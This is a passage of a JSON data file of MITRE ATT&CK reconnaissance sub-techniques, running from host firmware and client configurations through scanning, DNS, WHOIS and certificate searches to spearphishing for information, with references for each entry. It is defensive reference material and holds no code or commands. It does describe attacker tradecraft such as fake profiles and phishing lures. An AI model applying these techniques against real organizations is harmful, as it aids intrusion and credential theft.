    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a> or <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ArsTechnica Intel",
        "url": "https://arstechnica.com/information-technology/2020/08/intel-is-investigating-the-leak-of-20gb-of-its-source-code-and-private-data/",
        "description": "Goodin, D. & Salter, J. (2020, August 6). More than 20GB of Intel source code and proprietary data dumped online. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c",
    "platform": "pre",
    "tid": "T1592.004",
    "technique": "Client Configurations",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> (ex: listening ports, server banners, user agent strings) or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a> or <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ATT ScanBox",
        "url": "https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks",
        "description": "Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3",
    "platform": "pre",
    "tid": "T1593.001",
    "technique": "Social Media",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. <a href=\"https://attack.mitre.org/techniques/T1598/001\">Spearphishing Service</a>).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566/003\">Spearphishing via Service</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Cyware Social Media",
        "url": "https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e",
        "description": "Cyware Hacker News. (2019, October 2). How Hackers Exploit Social Media To Break Into Your Company. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968",
    "platform": "pre",
    "tid": "T1593.002",
    "technique": "Search Engines",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "SecurityTrails Google Hacking",
        "url": "https://securitytrails.com/blog/google-hacking-techniques",
        "description": "Borges, E. (2019, March 5). Exploring Google Hacking Techniques. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ExploitDB GoogleHacking",
        "url": "https://www.exploit-db.com/google-hacking-database",
        "description": "Offensive Security. (n.d.). Google Hacking Database. Retrieved October 23, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120",
    "platform": "pre",
    "tid": "T1595.001",
    "technique": "Scanning IP Blocks",
    "tactic": "reconnaissance",
    "datasources": "network-device-logs|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may scan IP blocks in order to <a href=\"https://attack.mitre.org/techniques/T1590\">Gather Victim Network Information</a>, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Botnet Scan",
        "url": "https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf",
        "description": "Dainotti, A. et al. (2012). Analysis of a “/0” Stealth Scan from a Botnet. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4",
    "platform": "pre",
    "tid": "T1595.002",
    "technique": "Vulnerability Scanning",
    "tactic": "reconnaissance",
    "datasources": "network-device-logs|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.<!-- raw HTML omitted --><!-- raw HTML omitted -->These scans may also include more broad attempts to <a href=\"https://attack.mitre.org/techniques/T1592\">Gather Victim Host Information</a> that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "OWASP Vuln Scanning",
        "url": "https://wiki.owasp.org/index.php/OAT-014_Vulnerability_Scanning",
        "description": "OWASP Wiki. (2018, February 16). OAT-014 Vulnerability Scanning. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532",
    "platform": "pre",
    "tid": "T1596.001",
    "technique": "DNS/Passive DNS",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f",
    "platform": "pre",
    "tid": "T1596.002",
    "technique": "WHOIS",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "WHOIS",
        "url": "https://www.whois.net/",
        "description": "NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
    "platform": "pre",
    "tid": "T1596.003",
    "technique": "Digital Certificates",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "SSLShopper Lookup",
        "url": "https://www.sslshopper.com/ssl-checker.html",
        "description": "SSL Shopper. (n.d.). SSL Checker. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium SSL Cert",
        "url": "https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2",
        "description": "Jain, M. (2019, September 16). Export & Download — SSL Certificate from Server (Site URL). Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75",
    "platform": "pre",
    "tid": "T1596.004",
    "technique": "CDNs",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "DigitalShadows CDN",
        "url": "https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/",
        "description": "Swisscom & Digital Shadows. (2017, September 6). Content Delivery Networks (CDNs) Can Leave You Exposed – How You Might Be Affected And What You Can Do About It. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f",
    "platform": "pre",
    "tid": "T1596.005",
    "technique": "Scan Databases",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Shodan",
        "url": "https://shodan.io",
        "description": "Shodan. (n.d.). Shodan. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41",
    "platform": "pre",
    "tid": "T1597.001",
    "technique": "Threat Intel Vendors",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a> or <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "D3Secutrity CTI Feeds",
        "url": "https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/",
        "description": "Banerd, W. (2019, April 30). 10 of the Best Open Source Threat Intelligence Feeds. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f",
    "platform": "pre",
    "tid": "T1597.002",
    "technique": "Purchase Technical Data",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ZDNET Selling Data",
        "url": "https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/",
        "description": "Cimpanu, C. (2020, May 9). A hacker group is selling more than 73 million user records on the dark web. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6",
    "platform": "pre",
    "tid": "T1598.001",
    "technique": "Spearphishing Service",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>) and/or sending multiple, seemingly urgent messages.<!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target’s interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>) to craft persuasive and believable lures.</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Social Media Phishing",
        "url": "https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/",
        "description": "O'Donnell, L. (2020, October 20). Facebook: A Top Launching Pad For Phishing Attacks. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc",
    "platform": "pre",
    "tid": "T1598.002",
    "technique": "Spearphishing Attachment",
    "tactic": "reconnaissance",
    "datasources": "email-gateway|mail-server",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>) and/or sending multiple, seemingly urgent messages.<!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>) to craft persuasive and believable lures.</p>\n",
    "technique_references": [
      {
        "source_name": "Sophos Attachment",
        "url": "https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/",
        "description": "Ducklin, P. (2020, October 2). Serious Security: Phishing without links – when phishers bring along their own web pages. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Phishery",
        "url": "https://github.com/ryhanson/phishery",
        "description": "Ryan Hanson. (2016, September 24). phishery. Retrieved October 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Anti Spoofing",
        "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
        "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ACSC Email Spoofing",
        "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
        "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
    "platform": "pre",
    "tid": "T1598.003",
    "technique": "Spearphishing Link",
    "tactic": "reconnaissance",
    "datasources": "email-gateway|mail-server",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>) and/or sending multiple, seemingly urgent messages.<!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>) to craft 